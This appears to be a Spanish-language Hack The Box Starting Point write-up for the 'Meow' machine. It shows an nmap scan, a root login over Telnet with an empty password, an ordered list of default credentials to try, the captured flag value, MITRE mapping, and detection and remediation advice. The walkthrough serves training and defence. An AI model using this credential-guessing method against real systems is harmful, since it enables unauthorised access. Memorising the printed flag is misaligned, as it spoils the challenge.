---
tags:
  - htb
  - starting-point
  - tier-0
  - easy
  - linux
  - telnet
  - default-credentials
  - Terminada
ip: 10.129.31.187
os: Linux
difficulty: Easy
status: Terminada
tiempo: 1h 0m
fecha_inicio: 2026-06-05
fecha_completada: 2026-06-05
puntos: 150
mitre_tactics:
  - TA0001 Initial Access
  - TA0007 Discovery
mitre_techniques:
  - T1078.001 Default Accounts
  - T1021 Remote Services
  - T1082 System Information Discovery
---

# 🖥️ Meow — Linux — Easy (Starting Point Tier 0)

> [!info] Resumen
> **IP:** `10.129.31.187` | **OS:** Linux | **Tier:** SP-0 | **Tiempo:** 1h 0m
> Servicio Telnet expuesto con credenciales por defecto (`root` sin contraseña). Acceso directo como root.

---

## 1. Reconocimiento

```bash
nmap -sCV -Pn 10.129.31.187 -oN nmap_meow.txt
```

| Puerto | Servicio | Versión | Hallazgo clave |
|--------|----------|---------|----------------|
| 23/TCP | Telnet | Linux telnetd | Único puerto abierto |

**→ Vector inmediato:** Telnet en puerto estándar. Sin web, sin SMB. Probar credenciales por defecto.

---

## 2. Explotación

```bash
telnet 10.129.31.187
# Meow login: root
# Password: (Enter vacío)
# → Shell root directa

whoami && id
# root / uid=0(root)

cat /root/flag.txt
```

> [!success] Flag
> `b40abdfe23665f766f9c61ecba8a4c19`

**Orden de prueba para credenciales por defecto:**
`root` → `admin` → `user` → `guest` (sin contraseña) → misma pass que user → `admin/admin` → [DefaultCreds-Cheat-Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)

---

## 3. MITRE ATT&CK

| Táctica | Técnica | ID | Uso |
|---------|---------|----|-----|
| Initial Access | Default Accounts | T1078.001 | `root` sin contraseña vía Telnet |
| Lateral Movement | Remote Services | T1021 | Telnet como vector remoto |
| Discovery | System Info Discovery | T1082 | `whoami`, `id`, `hostname` |

---

## 4. Detección & Remediación

**Blue Team detecta:**
- Conexión entrante TCP/23 desde IP externa (firewall/IDS)
- `telnetd: connect from <IP>` en syslog + login root desde IP no corporativa
- Credenciales visibles en texto plano si hay captura de red

**Remediación:**
- `systemctl disable telnetd --now` → reemplazar con SSH
- Deshabilitar login por contraseña en SSH: `PasswordAuthentication no`
- Segmentar administración remota detrás de VPN

---

## 5. Lecciones

- Telnet transmite todo en texto plano — credenciales capturables con Wireshark en cualquier punto de la red
- Siempre probar `root` primero en Linux antes de `admin`
- Un solo puerto abierto elimina hipótesis — no enumerar lo que no existe

**Bloqueado:**

| Fase | Causa | Fix |
|------|-------|-----|
| Login | Probé `admin` antes que `root` | En Linux: `root` siempre primero |

---

## 6. Conexiones

- Mismo vector (default creds): `[[HTB/Fawn/Fawn]]` (FTP), `[[HTB/Explosion/Explosion]]` (RDP)
- Técnica: `[[Técnicas/Default-Credentials]]`

**Referencias:** [HackTricks Telnet](https://book.hacktricks.xyz/network-services-pentesting/pentesting-telnet) · [RFC 854](https://datatracker.ietf.org/doc/html/rfc854) · [MITRE T1078.001](https://attack.mitre.org/techniques/T1078/001/)
